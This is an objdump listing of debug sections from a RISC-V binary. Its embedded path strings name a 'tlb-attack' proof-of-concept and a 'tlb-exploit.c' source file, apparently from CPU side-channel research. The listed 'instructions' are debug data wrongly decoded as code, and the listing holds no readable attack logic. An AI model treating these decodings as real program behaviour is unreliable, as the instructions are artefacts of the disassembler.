    15ce:	0900                	.2byte	0x900
    15d0:	0010                	.2byte	0x10
    15d2:	0501                	.2byte	0x501
    15d4:	09000327          	.4byte	0x9000327
    15d8:	0008                	.2byte	0x8
    15da:	0501                	.2byte	0x501
    15dc:	031c                	.2byte	0x31c
    15de:	0900                	.2byte	0x900
    15e0:	0014                	.2byte	0x14
    15e2:	0501                	.2byte	0x501
    15e4:	0312                	.2byte	0x312
    15e6:	0901                	.2byte	0x901
    15e8:	0008                	.2byte	0x8
    15ea:	0501                	.2byte	0x501
    15ec:	0309                	.2byte	0x309
    15ee:	0900                	.2byte	0x900
    15f0:	0014                	.2byte	0x14
    15f2:	0501                	.2byte	0x501
    15f4:	0322                	.2byte	0x322
    15f6:	0900                	.2byte	0x900
    15f8:	0004                	.2byte	0x4
    15fa:	0501                	.2byte	0x501
    15fc:	0319                	.2byte	0x319
    15fe:	0900                	.2byte	0x900
    1600:	0014                	.2byte	0x14
    1602:	0501                	.2byte	0x501
    1604:	0901030f          	.4byte	0x901030f
    1608:	0004                	.2byte	0x4
    160a:	0501                	.2byte	0x501
    160c:	0308                	.2byte	0x308
    160e:	0900                	.2byte	0x900
    1610:	0014                	.2byte	0x14
    1612:	0501                	.2byte	0x501
    1614:	001f 0402 0301      	.byte	0x1f, 0x00, 0x02, 0x04, 0x01, 0x03
    161a:	0900                	.2byte	0x900
    161c:	0004                	.2byte	0x4
    161e:	0501                	.2byte	0x501
    1620:	0021                	.2byte	0x21
    1622:	0402                	.2byte	0x402
    1624:	0301                	.2byte	0x301
    1626:	0900                	.2byte	0x900
    1628:	000c                	.2byte	0xc
    162a:	0501                	.2byte	0x501
    162c:	0402001b          	addw	zero,tp,64 # 40 <buf.4>
    1630:	0302                	.2byte	0x302
    1632:	0010097b          	.4byte	0x10097b
    1636:	0501                	.2byte	0x501
    1638:	0014                	.2byte	0x14
    163a:	0402                	.2byte	0x402
    163c:	0301                	.2byte	0x301
    163e:	0900                	.2byte	0x900
    1640:	000c                	.2byte	0xc
    1642:	0501                	.2byte	0x501
    1644:	0016                	.2byte	0x16
    1646:	0402                	.2byte	0x402
    1648:	0301                	.2byte	0x301
    164a:	0900                	.2byte	0x900
    164c:	0014                	.2byte	0x14
    164e:	0501                	.2byte	0x501
    1650:	0011                	.2byte	0x11
    1652:	0402                	.2byte	0x402
    1654:	0301                	.2byte	0x301
    1656:	0900                	.2byte	0x900
    1658:	0008                	.2byte	0x8
    165a:	0501                	.2byte	0x501
    165c:	030d                	.2byte	0x30d
    165e:	000c0907          	.4byte	0xc0907
    1662:	0501                	.2byte	0x501
    1664:	0306                	.2byte	0x306
    1666:	0900                	.2byte	0x900
    1668:	000c                	.2byte	0xc
    166a:	0501                	.2byte	0x501
    166c:	0019                	.2byte	0x19
    166e:	0402                	.2byte	0x402
    1670:	0301                	.2byte	0x301
    1672:	0900                	.2byte	0x900
    1674:	0004                	.2byte	0x4
    1676:	0501                	.2byte	0x501
    1678:	0028                	.2byte	0x28
    167a:	0402                	.2byte	0x402
    167c:	0301                	.2byte	0x301
    167e:	0900                	.2byte	0x900
    1680:	0018                	.2byte	0x18
    1682:	0501                	.2byte	0x501
    1684:	0012                	.2byte	0x12
    1686:	0402                	.2byte	0x402
    1688:	0301                	.2byte	0x301
    168a:	0900                	.2byte	0x900
    168c:	0018                	.2byte	0x18
    168e:	0501                	.2byte	0x501
    1690:	030c                	.2byte	0x30c
    1692:	0901                	.2byte	0x901
    1694:	0008                	.2byte	0x8
    1696:	0501                	.2byte	0x501
    1698:	030a                	.2byte	0x30a
    169a:	0901                	.2byte	0x901
    169c:	0008                	.2byte	0x8
    169e:	0501                	.2byte	0x501
    16a0:	0301                	.2byte	0x301
    16a2:	0901                	.2byte	0x901
    16a4:	0004                	.2byte	0x4
    16a6:	0301                	.2byte	0x301
    16a8:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    16ac:	0501                	.2byte	0x501
    16ae:	09050303          	lb	t1,144(a0)
    16b2:	0014                	.2byte	0x14
    16b4:	0501                	.2byte	0x501
    16b6:	0311                	.2byte	0x311
    16b8:	0902                	.2byte	0x902
    16ba:	0004                	.2byte	0x4
    16bc:	0501                	.2byte	0x501
    16be:	0900030f          	.4byte	0x900030f
    16c2:	0010                	.2byte	0x10
    16c4:	0501                	.2byte	0x501
    16c6:	09010307          	.4byte	0x9010307
    16ca:	0004                	.2byte	0x4
    16cc:	0501                	.2byte	0x501
    16ce:	0330                	.2byte	0x330
    16d0:	0900                	.2byte	0x900
    16d2:	001c                	.2byte	0x1c
    16d4:	0501                	.2byte	0x501
    16d6:	0306                	.2byte	0x306
    16d8:	0900                	.2byte	0x900
    16da:	000c                	.2byte	0xc
    16dc:	0501                	.2byte	0x501
    16de:	0902030b          	.4byte	0x902030b
    16e2:	0004                	.2byte	0x4
    16e4:	0301                	.2byte	0x301
    16e6:	0901                	.2byte	0x901
    16e8:	000c                	.2byte	0xc
    16ea:	0501                	.2byte	0x501
    16ec:	030d                	.2byte	0x30d
    16ee:	0902                	.2byte	0x902
    16f0:	0014                	.2byte	0x14
    16f2:	0501                	.2byte	0x501
    16f4:	0014                	.2byte	0x14
    16f6:	0402                	.2byte	0x402
    16f8:	0301                	.2byte	0x301
    16fa:	0900                	.2byte	0x900
    16fc:	0004                	.2byte	0x4
    16fe:	0501                	.2byte	0x501
    1700:	09030303          	lb	t1,144(t1) # 9011654 <threadsense.2+0x90115d0>
    1704:	0018                	.2byte	0x18
    1706:	0501                	.2byte	0x501
    1708:	0301                	.2byte	0x301
    170a:	0901                	.2byte	0x901
    170c:	0004                	.2byte	0x4
    170e:	0301                	.2byte	0x301
    1710:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    1714:	0501                	.2byte	0x501
    1716:	031a                	.2byte	0x31a
    1718:	0901                	.2byte	0x901
    171a:	0010                	.2byte	0x10
    171c:	0501                	.2byte	0x501
    171e:	0315                	.2byte	0x315
    1720:	0900                	.2byte	0x900
    1722:	0008                	.2byte	0x8
    1724:	0501                	.2byte	0x501
    1726:	030c                	.2byte	0x30c
    1728:	0900                	.2byte	0x900
    172a:	0008                	.2byte	0x8
    172c:	0501                	.2byte	0x501
    172e:	030d                	.2byte	0x30d
    1730:	0901                	.2byte	0x901
    1732:	0008                	.2byte	0x8
    1734:	0501                	.2byte	0x501
    1736:	031a                	.2byte	0x31a
    1738:	0900                	.2byte	0x900
    173a:	0008                	.2byte	0x8
    173c:	0501                	.2byte	0x501
    173e:	09000313          	li	t1,144
    1742:	0008                	.2byte	0x8
    1744:	0501                	.2byte	0x501
    1746:	0301                	.2byte	0x301
    1748:	0901                	.2byte	0x901
    174a:	0004                	.2byte	0x4
    174c:	0301                	.2byte	0x301
    174e:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
    1752:	0501                	.2byte	0x501
    1754:	0901031b          	addw	t1,sp,144
    1758:	0010                	.2byte	0x10
    175a:	0501                	.2byte	0x501
    175c:	0316                	.2byte	0x316
    175e:	0900                	.2byte	0x900
    1760:	0008                	.2byte	0x8
    1762:	0501                	.2byte	0x501
    1764:	030c                	.2byte	0x30c
    1766:	0900                	.2byte	0x900
    1768:	0008                	.2byte	0x8
    176a:	0501                	.2byte	0x501
    176c:	030d                	.2byte	0x30d
    176e:	0901                	.2byte	0x901
    1770:	0008                	.2byte	0x8
    1772:	0501                	.2byte	0x501
    1774:	031c                	.2byte	0x31c
    1776:	0900                	.2byte	0x900
    1778:	0008                	.2byte	0x8
    177a:	0501                	.2byte	0x501
    177c:	0314                	.2byte	0x314
    177e:	0900                	.2byte	0x900
    1780:	0008                	.2byte	0x8
    1782:	0501                	.2byte	0x501
    1784:	0301                	.2byte	0x301
    1786:	0901                	.2byte	0x901
    1788:	0004                	.2byte	0x4
    178a:	0401                	.2byte	0x401
    178c:	0502                	.2byte	0x502
    178e:	031e                	.2byte	0x31e
    1790:	7f96                	.2byte	0x7f96
    1792:	1009                	.2byte	0x1009
    1794:	0100                	.2byte	0x100
    1796:	0505                	.2byte	0x505
    1798:	10090203          	lb	tp,256(s2)
    179c:	0100                	.2byte	0x100
    179e:	04090303          	lb	t1,64(s2)
    17a2:	0100                	.2byte	0x100
    17a4:	60091103          	lh	sp,1536(s2)
    17a8:	0100                	.2byte	0x100
    17aa:	04090303          	lb	t1,64(s2)
    17ae:	0100                	.2byte	0x100
    17b0:	60091503          	lh	a0,1536(s2)
    17b4:	0100                	.2byte	0x100
    17b6:	0105                	.2byte	0x105
    17b8:	04090103          	lb	sp,64(s2)
    17bc:	0100                	.2byte	0x100
    17be:	1005                	.2byte	0x1005
    17c0:	0c090203          	lb	tp,192(s2)
    17c4:	0100                	.2byte	0x100
    17c6:	0e05                	.2byte	0xe05
    17c8:	10090103          	lb	sp,256(s2)
    17cc:	0100                	.2byte	0x100
    17ce:	0d05                	.2byte	0xd05
    17d0:	10090103          	lb	sp,256(s2)
    17d4:	0100                	.2byte	0x100
    17d6:	10090103          	lb	sp,256(s2)
    17da:	0100                	.2byte	0x100
    17dc:	0e05                	.2byte	0xe05
    17de:	10090603          	lb	a2,256(s2)
    17e2:	0100                	.2byte	0x100
    17e4:	0505                	.2byte	0x505
    17e6:	08090003          	lb	zero,128(s2)
    17ea:	0100                	.2byte	0x100
    17ec:	1205                	.2byte	0x1205
    17ee:	04090203          	lb	tp,64(s2)
    17f2:	0100                	.2byte	0x100
    17f4:	04090103          	lb	sp,64(s2)
    17f8:	0100                	.2byte	0x100
    17fa:	0905                	.2byte	0x905
    17fc:	04090003          	lb	zero,64(s2)
    1800:	0100                	.2byte	0x100
    1802:	0d05                	.2byte	0xd05
    1804:	0200                	.2byte	0x200
    1806:	0304                	.2byte	0x304
    1808:	04090203          	lb	tp,64(s2)
    180c:	0100                	.2byte	0x100
    180e:	1a05                	.2byte	0x1a05
    1810:	0200                	.2byte	0x200
    1812:	0304                	.2byte	0x304
    1814:	0c090403          	lb	s0,192(s2)
    1818:	0100                	.2byte	0x100
    181a:	1305                	.2byte	0x1305
    181c:	0200                	.2byte	0x200
    181e:	0304                	.2byte	0x304
    1820:	0c090003          	lb	zero,192(s2)
    1824:	0100                	.2byte	0x100
    1826:	2505                	.2byte	0x2505
    1828:	0200                	.2byte	0x200
    182a:	0304                	.2byte	0x304
    182c:	04097a03          	.4byte	0x4097a03
    1830:	0100                	.2byte	0x100
    1832:	1b05                	.2byte	0x1b05
    1834:	0200                	.2byte	0x200
    1836:	0104                	.2byte	0x104
    1838:	0c090003          	lb	zero,192(s2)
    183c:	0100                	.2byte	0x100
    183e:	0d05                	.2byte	0xd05
    1840:	0c090e03          	lb	t3,192(s2)
    1844:	0100                	.2byte	0x100
    1846:	1205                	.2byte	0x1205
    1848:	04090103          	lb	sp,64(s2)
    184c:	0100                	.2byte	0x100
    184e:	0905                	.2byte	0x905
    1850:	04090003          	lb	zero,64(s2)
    1854:	0100                	.2byte	0x100
    1856:	1705                	.2byte	0x1705
    1858:	04090103          	lb	sp,64(s2)
    185c:	0100                	.2byte	0x100
    185e:	1005                	.2byte	0x1005
    1860:	14090003          	lb	zero,320(s2)
    1864:	0100                	.2byte	0x100
    1866:	1405                	.2byte	0x1405
    1868:	08090103          	lb	sp,128(s2)
    186c:	0100                	.2byte	0x100
    186e:	2505                	.2byte	0x2505
    1870:	0200                	.2byte	0x200
    1872:	0204                	.2byte	0x204
    1874:	0c097e03          	.4byte	0xc097e03
    1878:	0100                	.2byte	0x100
    187a:	1b05                	.2byte	0x1b05
    187c:	0200                	.2byte	0x200
    187e:	0104                	.2byte	0x104
    1880:	0c090003          	lb	zero,192(s2)
    1884:	0100                	.2byte	0x100
    1886:	2705                	.2byte	0x2705
    1888:	0c090603          	lb	a2,192(s2)
    188c:	0100                	.2byte	0x100
    188e:	1305                	.2byte	0x1305
    1890:	14090003          	lb	zero,320(s2)
    1894:	0100                	.2byte	0x100
    1896:	1405                	.2byte	0x1405
    1898:	10090103          	lb	sp,256(s2)
    189c:	0100                	.2byte	0x100
    189e:	3105                	.2byte	0x3105
    18a0:	0200                	.2byte	0x200
    18a2:	0104                	.2byte	0x104
    18a4:	0c090003          	lb	zero,192(s2)
    18a8:	0100                	.2byte	0x100
    18aa:	1405                	.2byte	0x1405
    18ac:	0200                	.2byte	0x200
    18ae:	0104                	.2byte	0x104
    18b0:	08090003          	lb	zero,128(s2)
    18b4:	0100                	.2byte	0x100
    18b6:	0200                	.2byte	0x200
    18b8:	0204                	.2byte	0x204
    18ba:	0306                	.2byte	0x306
    18bc:	0900                	.2byte	0x900
    18be:	0010                	.2byte	0x10
    18c0:	0001                	.2byte	0x1
    18c2:	0402                	.2byte	0x402
    18c4:	0304                	.2byte	0x304
    18c6:	0900                	.2byte	0x900
    18c8:	0008                	.2byte	0x8
    18ca:	0501                	.2byte	0x501
    18cc:	002d                	.2byte	0x2d
    18ce:	0402                	.2byte	0x402
    18d0:	0604                	.2byte	0x604
    18d2:	10096703          	lwu	a4,256(s2)
    18d6:	0100                	.2byte	0x100
    18d8:	2405                	.2byte	0x2405
    18da:	0200                	.2byte	0x200
    18dc:	0204                	.2byte	0x204
    18de:	0c090003          	lb	zero,192(s2)
    18e2:	0100                	.2byte	0x100
    18e4:	0e05                	.2byte	0xe05
    18e6:	0c092403          	lw	s0,192(s2)
    18ea:	0100                	.2byte	0x100
    18ec:	08090103          	lb	sp,128(s2)
    18f0:	0100                	.2byte	0x100
    18f2:	0d05                	.2byte	0xd05
    18f4:	0c090103          	lb	sp,192(s2)
    18f8:	0100                	.2byte	0x100
    18fa:	1305                	.2byte	0x1305
    18fc:	04090103          	lb	sp,64(s2)
    1900:	0100                	.2byte	0x100
    1902:	0505                	.2byte	0x505
    1904:	0c090103          	lb	sp,192(s2)
    1908:	0100                	.2byte	0x100
    190a:	1305                	.2byte	0x1305
    190c:	04090103          	lb	sp,64(s2)
    1910:	0100                	.2byte	0x100
    1912:	0c05                	.2byte	0xc05
    1914:	08090103          	lb	sp,128(s2)
    1918:	0100                	.2byte	0x100
    191a:	0105                	.2byte	0x105
    191c:	04090103          	lb	sp,64(s2)
    1920:	0100                	.2byte	0x100
    1922:	1409                	.2byte	0x1409
    1924:	0000                	.2byte	0x0
    1926:	0101                	.2byte	0x101

Disassembly of section .debug_line_str:

0000000000000000 <.debug_line_str>:
   0:	746e6d2f          	.4byte	0x746e6d2f
   4:	6c696d2f          	.4byte	0x6c696d2f
   8:	7365                	.2byte	0x7365
   a:	6e61                	.2byte	0x6e61
   c:	6d2d                	.2byte	0x6d2d
   e:	7465                	.2byte	0x7465
  10:	2f61                	.2byte	0x2f61
  12:	6f70                	.2byte	0x6f70
  14:	732f7363          	bgeu	t5,s2,73a <threadsense.2+0x6b6>
  18:	6570                	.2byte	0x6570
  1a:	636f6463          	bltu	t5,s6,642 <threadsense.2+0x5be>
  1e:	6f74                	.2byte	0x6f74
  20:	2f72                	.2byte	0x2f72
  22:	6c74                	.2byte	0x6c74
  24:	2d62                	.2byte	0x2d62
  26:	7461                	.2byte	0x7461
  28:	6174                	.2byte	0x6174
  2a:	542f6b63          	bltu	t5,sp,580 <threadsense.2+0x4fc>
  2e:	6d65                	.2byte	0x6d65
  30:	6c70                	.2byte	0x6c70
  32:	7461                	.2byte	0x7461
  34:	0065                	.2byte	0x65
  36:	00637273          	csrrc	tp,0x6,6
  3a:	6e65                	.2byte	0x6e65
  3c:	7274                	.2byte	0x7274
  3e:	2e79                	.2byte	0x2e79
  40:	72730053          	.4byte	0x72730053
  44:	6d702f63          	.4byte	0x6d702f63
  48:	2e70                	.2byte	0x2e70
  4a:	722f0063          	beq	t5,sp,76a <threadsense.2+0x6e6>
  4e:	2f746f6f          	jal	t5,46b44 <threadsense.2+0x46ac0>
  52:	7270                	.2byte	0x7270
  54:	6665                	.2byte	0x6665
  56:	7869                	.2byte	0x7869
  58:	6d2d                	.2byte	0x6d2d
  5a:	6c69                	.2byte	0x6c69
  5c:	7365                	.2byte	0x7365
  5e:	6e61                	.2byte	0x6e61
  60:	7369722f          	.4byte	0x7369722f
  64:	722f7663          	bgeu	t5,sp,790 <threadsense.2+0x70c>
  68:	7369                	.2byte	0x7369
  6a:	34367663          	bgeu	a2,gp,3b6 <threadsense.2+0x332>
  6e:	752d                	.2byte	0x752d
  70:	6b6e                	.2byte	0x6b6e
  72:	6f6e                	.2byte	0x6f6e
  74:	652d6e77          	.4byte	0x652d6e77
  78:	666c                	.2byte	0x666c
  7a:	636e692f          	.4byte	0x636e692f
  7e:	756c                	.2byte	0x756c
  80:	6564                	.2byte	0x6564
  82:	63616d2f          	.4byte	0x63616d2f
  86:	6968                	.2byte	0x6968
  88:	656e                	.2byte	0x656e
  8a:	2f00                	.2byte	0x2f00
  8c:	6f72                	.2byte	0x6f72
  8e:	702f746f          	jal	s0,f7790 <threadsense.2+0xf770c>
  92:	6572                	.2byte	0x6572
  94:	6966                	.2byte	0x6966
  96:	2d78                	.2byte	0x2d78
  98:	696d                	.2byte	0x696d
  9a:	656c                	.2byte	0x656c
  9c:	2f6e6173          	csrrs	sp,0x2f6,28
  a0:	6972                	.2byte	0x6972
  a2:	2f766373          	csrrs	t1,0x2f7,12
  a6:	6972                	.2byte	0x6972
  a8:	36766373          	csrrs	t1,0x367,12
  ac:	2d34                	.2byte	0x2d34
  ae:	6e75                	.2byte	0x6e75
  b0:	776f6e6b          	.4byte	0x776f6e6b
  b4:	2d6e                	.2byte	0x2d6e
  b6:	6c65                	.2byte	0x6c65
  b8:	2f66                	.2byte	0x2f66
  ba:	6e69                	.2byte	0x6e69
  bc:	64756c63          	bltu	a0,t2,714 <threadsense.2+0x690>
  c0:	2f65                	.2byte	0x2f65
  c2:	00737973          	csrrc	s2,0x7,6
  c6:	645f 6665 7561      	.byte	0x5f, 0x64, 0x65, 0x66, 0x61, 0x75
  cc:	746c                	.2byte	0x746c
  ce:	745f 7079 7365      	.byte	0x5f, 0x74, 0x79, 0x70, 0x65, 0x73
  d4:	682e                	.2byte	0x682e
  d6:	5f00                	.2byte	0x5f00
  d8:	69647473          	csrrc	s0,0x696,8
  dc:	746e                	.2byte	0x746e
  de:	682e                	.2byte	0x682e
  e0:	7300                	.2byte	0x7300
  e2:	6372                	.2byte	0x6372
  e4:	7379732f          	.4byte	0x7379732f
  e8:	6c6c6163          	bltu	s8,t1,7aa <threadsense.2+0x726>
  ec:	00632e73          	csrrs	t3,0x6,t1
  f0:	6e69                	.2byte	0x6e69
  f2:	722f0063          	beq	t5,sp,812 <threadsense.2+0x78e>
  f6:	2f746f6f          	jal	t5,46bec <threadsense.2+0x46b68>
  fa:	7270                	.2byte	0x7270
  fc:	6665                	.2byte	0x6665
  fe:	7869                	.2byte	0x7869
 100:	6d2d                	.2byte	0x6d2d
 102:	6c69                	.2byte	0x6c69
 104:	7365                	.2byte	0x7365
 106:	6e61                	.2byte	0x6e61
 108:	7369722f          	.4byte	0x7369722f
 10c:	722f7663          	bgeu	t5,sp,838 <threadsense.2+0x7b4>
 110:	7369                	.2byte	0x7369
 112:	34367663          	bgeu	a2,gp,45e <threadsense.2+0x3da>
 116:	752d                	.2byte	0x752d
 118:	6b6e                	.2byte	0x6b6e
 11a:	6f6e                	.2byte	0x6f6e
 11c:	652d6e77          	.4byte	0x652d6e77
 120:	666c                	.2byte	0x666c
 122:	636e692f          	.4byte	0x636e692f
 126:	756c                	.2byte	0x756c
 128:	6564                	.2byte	0x6564
 12a:	2f00                	.2byte	0x2f00
 12c:	6f72                	.2byte	0x6f72
 12e:	702f746f          	jal	s0,f7830 <threadsense.2+0xf77ac>
 132:	6572                	.2byte	0x6572
 134:	6966                	.2byte	0x6966
 136:	2d78                	.2byte	0x2d78
 138:	696d                	.2byte	0x696d
 13a:	656c                	.2byte	0x656c
 13c:	2f6e6173          	csrrs	sp,0x2f6,28
 140:	6972                	.2byte	0x6972
 142:	2f766373          	csrrs	t1,0x2f7,12
 146:	696c                	.2byte	0x696c
 148:	2f62                	.2byte	0x2f62
 14a:	2f636367          	.4byte	0x2f636367
 14e:	6972                	.2byte	0x6972
 150:	36766373          	csrrs	t1,0x367,12
 154:	2d34                	.2byte	0x2d34
 156:	6e75                	.2byte	0x6e75
 158:	776f6e6b          	.4byte	0x776f6e6b
 15c:	2d6e                	.2byte	0x2d6e
 15e:	6c65                	.2byte	0x6c65
 160:	2f66                	.2byte	0x2f66
 162:	3231                	.2byte	0x3231
 164:	322e                	.2byte	0x322e
 166:	302e                	.2byte	0x302e
 168:	636e692f          	.4byte	0x636e692f
 16c:	756c                	.2byte	0x756c
 16e:	6564                	.2byte	0x6564
 170:	7500                	.2byte	0x7500
 172:	6974                	.2byte	0x6974
 174:	2e6c                	.2byte	0x2e6c
 176:	0068                	.2byte	0x68
 178:	69647473          	csrrc	s0,0x696,8
 17c:	00682e6f          	jal	t3,82182 <threadsense.2+0x820fe>
 180:	64647473          	csrrc	s0,hviprio1,8
 184:	6665                	.2byte	0x6665
 186:	682e                	.2byte	0x682e
 188:	7300                	.2byte	0x7300
 18a:	6474                	.2byte	0x6474
 18c:	7261                	.2byte	0x7261
 18e:	00682e67          	.4byte	0x682e67
 192:	69727473          	csrrc	s0,0x697,4
 196:	676e                	.2byte	0x676e
 198:	682e                	.2byte	0x682e
 19a:	7300                	.2byte	0x7300
 19c:	6372                	.2byte	0x6372
 19e:	2e6d762f          	.4byte	0x2e6d762f
 1a2:	6d760063          	beq	a2,s7,862 <threadsense.2+0x7de>
 1a6:	682e                	.2byte	0x682e
 1a8:	2f00                	.2byte	0x2f00
 1aa:	6e6d                	.2byte	0x6e6d
 1ac:	2f74                	.2byte	0x2f74
 1ae:	696d                	.2byte	0x696d
 1b0:	656c                	.2byte	0x656c
 1b2:	2d6e6173          	csrrs	sp,0x2d6,28
 1b6:	656d                	.2byte	0x656d
 1b8:	6174                	.2byte	0x6174
 1ba:	636f702f          	.4byte	0x636f702f
 1be:	70732f73          	csrrs	t5,0x707,t1
 1c2:	6365                	.2byte	0x6365
 1c4:	6f64                	.2byte	0x6f64
 1c6:	726f7463          	bgeu	t5,t1,8ee <threadsense.2+0x86a>
 1ca:	626c742f          	.4byte	0x626c742f
 1ce:	612d                	.2byte	0x612d
 1d0:	7474                	.2byte	0x7474
 1d2:	6361                	.2byte	0x6361
 1d4:	65542f6b          	.4byte	0x65542f6b
 1d8:	706d                	.2byte	0x706d
 1da:	616c                	.2byte	0x616c
 1dc:	6574                	.2byte	0x6574
 1de:	626c742f          	.4byte	0x626c742f
 1e2:	652d                	.2byte	0x652d
 1e4:	7078                	.2byte	0x7078
 1e6:	6f6c                	.2byte	0x6f6c
 1e8:	7469                	.2byte	0x7469
 1ea:	632e                	.2byte	0x632e
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	001f 0000 0005      	.byte	0x1f, 0x00, 0x00, 0x00, 0x05, 0x00
       6:	0801                	.2byte	0x801
       8:	0000                	.2byte	0x0
       a:	0000                	.2byte	0x0
       c:	0001                	.2byte	0x1
       e:	0000                	.2byte	0x0
      10:	0c00                	.2byte	0xc00
      12:	0000                	.2byte	0x0
      14:	0000                	.2byte	0x0
      16:	0000                	.2byte	0x0
      18:	0c00                	.2byte	0xc00
      1a:	0000                	.2byte	0x0
      1c:	4200                	.2byte	0x4200
      1e:	0000                	.2byte	0x0
      20:	0100                	.2byte	0x100
      22:	e580                	.2byte	0xe580
      24:	0000                	.2byte	0x0
      26:	0500                	.2byte	0x500
      28:	0100                	.2byte	0x100
      2a:	1208                	.2byte	0x1208
      2c:	0000                	.2byte	0x0
      2e:	0400                	.2byte	0x400
      30:	007d                	.2byte	0x7d
      32:	0000                	.2byte	0x0
      34:	420c                	.2byte	0x420c
      36:	0000                	.2byte	0x0
      38:	0000                	.2byte	0x0
      3a:	0000                	.2byte	0x0
      3c:	4800                	.2byte	0x4800
      3e:	0070                	.2byte	0x70
      40:	0080                	.2byte	0x80
      42:	0000                	.2byte	0x0
      44:	8400                	.2byte	0x8400
      46:	0000                	.2byte	0x0
      48:	0000                	.2byte	0x0
      4a:	0000                	.2byte	0x0
      4c:	af00                	.2byte	0xaf00
      4e:	0002                	.2byte	0x2
      50:	0100                	.2byte	0x100
      52:	0601                	.2byte	0x601
      54:	0071                	.2byte	0x71
      56:	0000                	.2byte	0x0
      58:	5002                	.2byte	0x5002
      5a:	0000                	.2byte	0x0
      5c:	0200                	.2byte	0x200
      5e:	0041182b          	.4byte	0x41182b
      62:	0000                	.2byte	0x0
      64:	0101                	.2byte	0x101
      66:	6f08                	.2byte	0x6f08
      68:	0000                	.2byte	0x0
      6a:	0100                	.2byte	0x100
      6c:	0502                	.2byte	0x502
      6e:	012e                	.2byte	0x12e
      70:	0000                	.2byte	0x0
      72:	0201                	.2byte	0x201
      74:	00011b07          	.4byte	0x11b07
      78:	0500                	.2byte	0x500
      7a:	0504                	.2byte	0x504
      7c:	6e69                	.2byte	0x6e69
      7e:	0074                	.2byte	0x74
      80:	0401                	.2byte	0x401
      82:	00028807          	.4byte	0x28807
      86:	0100                	.2byte	0x100
      88:	0508                	.2byte	0x508
      8a:	020d                	.2byte	0x20d
      8c:	0000                	.2byte	0x0
      8e:	0801                	.2byte	0x801
      90:	00028307          	.4byte	0x28307
      94:	0200                	.2byte	0x200
      96:	005a                	.2byte	0x5a
      98:	0000                	.2byte	0x0
      9a:	e802                	.2byte	0xe802
      9c:	6b1a                	.2byte	0x6b1a
      9e:	0000                	.2byte	0x0
      a0:	0200                	.2byte	0x200
      a2:	0052                	.2byte	0x52
      a4:	0000                	.2byte	0x0
      a6:	35131803          	lh	a6,849(t1)
      aa:	0000                	.2byte	0x0
      ac:	0200                	.2byte	0x200
      ae:	005c                	.2byte	0x5c
      b0:	0000                	.2byte	0x0
      b2:	72155203          	lhu	tp,1825(a0)
      b6:	0000                	.2byte	0x0
      b8:	0600                	.2byte	0x600
      ba:	007e                	.2byte	0x7e
      bc:	0000                	.2byte	0x0
      be:	000000a7          	.4byte	0xa7
      c2:	00006b07          	.4byte	0x6b07
      c6:	ff00                	.2byte	0xff00
      c8:	3d08000f          	.4byte	0x3d08000f
      cc:	0001                	.2byte	0x1
      ce:	0100                	.2byte	0x100
      d0:	1008                	.2byte	0x1008
      d2:	0096                	.2byte	0x96
      d4:	0000                	.2byte	0x0
      d6:	6609                	.2byte	0x6609
      d8:	0000                	.2byte	0x0
      da:	0100                	.2byte	0x100
      dc:	060a                	.2byte	0x60a
      de:	7048                	.2byte	0x7048
      e0:	8000                	.2byte	0x8000
      e2:	0000                	.2byte	0x0
      e4:	0000                	.2byte	0x0
      e6:	0084                	.2byte	0x84
      e8:	0000                	.2byte	0x0
      ea:	0000                	.2byte	0x0
      ec:	0000                	.2byte	0x0
      ee:	9c01                	.2byte	0x9c01
      f0:	00014403          	lbu	s0,0(sp)
      f4:	0c00                	.2byte	0xc00
      f6:	008a                	.2byte	0x8a
      f8:	0000                	.2byte	0x0
      fa:	9102                	.2byte	0x9102
      fc:	0368                	.2byte	0x368
      fe:	0138                	.2byte	0x138
     100:	0000                	.2byte	0x0
     102:	8a0d                	.2byte	0x8a0d
     104:	0000                	.2byte	0x0
     106:	0200                	.2byte	0x200
     108:	6091                	.2byte	0x6091
     10a:	0000                	.2byte	0x0
     10c:	0c92                	.2byte	0xc92
     10e:	0000                	.2byte	0x0
     110:	0005                	.2byte	0x5
     112:	0801                	.2byte	0x801
     114:	009a                	.2byte	0x9a
     116:	0000                	.2byte	0x0
     118:	7d1e                	.2byte	0x7d1e
     11a:	0000                	.2byte	0x0
     11c:	0c00                	.2byte	0xc00
     11e:	00e1                	.2byte	0xe1
     120:	0000                	.2byte	0x0
     122:	0000                	.2byte	0x0
     124:	0000                	.2byte	0x0
     126:	70cc                	.2byte	0x70cc
     128:	8000                	.2byte	0x8000
     12a:	0000                	.2byte	0x0
     12c:	0000                	.2byte	0x0
     12e:	146c                	.2byte	0x146c
     130:	0000                	.2byte	0x0
     132:	0000                	.2byte	0x0
     134:	0000                	.2byte	0x0
     136:	035d                	.2byte	0x35d
     138:	0000                	.2byte	0x0
     13a:	71060107          	.4byte	0x71060107
     13e:	0000                	.2byte	0x0
     140:	0700                	.2byte	0x700
     142:	0801                	.2byte	0x801
     144:	0000006f          	j	144 <threadsense.2+0xc0>
     148:	2e050207          	.4byte	0x2e050207
     14c:	0001                	.2byte	0x1
     14e:	0700                	.2byte	0x700
     150:	0702                	.2byte	0x702
     152:	0000011b          	sext.w	sp,zero
     156:	041f 6905 746e      	.byte	0x1f, 0x04, 0x05, 0x69, 0x6e, 0x74
     15c:	0e00                	.2byte	0xe00
     15e:	004a                	.2byte	0x4a
     160:	0000                	.2byte	0x0
     162:	510c                	.2byte	0x510c
     164:	0000                	.2byte	0x0
     166:	0c00                	.2byte	0xc00
     168:	004a                	.2byte	0x4a
     16a:	0000                	.2byte	0x0
     16c:	88070407          	.4byte	0x88070407
     170:	0002                	.2byte	0x2
     172:	0700                	.2byte	0x700
     174:	0508                	.2byte	0x508
     176:	020d                	.2byte	0x20d
     178:	0000                	.2byte	0x0
     17a:	d409                	.2byte	0xd409
     17c:	0002                	.2byte	0x2
     17e:	0400                	.2byte	0x400
     180:	1969                	.2byte	0x1969
     182:	007a                	.2byte	0x7a
     184:	0000                	.2byte	0x0
     186:	83070807          	.4byte	0x83070807
     18a:	0002                	.2byte	0x2
     18c:	0900                	.2byte	0x900
     18e:	005a                	.2byte	0x5a
     190:	0000                	.2byte	0x0
     192:	e804                	.2byte	0xe804
     194:	7a1a                	.2byte	0x7a1a
     196:	0000                	.2byte	0x0
     198:	0900                	.2byte	0x900
     19a:	02d6                	.2byte	0x2d6
     19c:	0000                	.2byte	0x0
     19e:	3c05                	.2byte	0x3c05
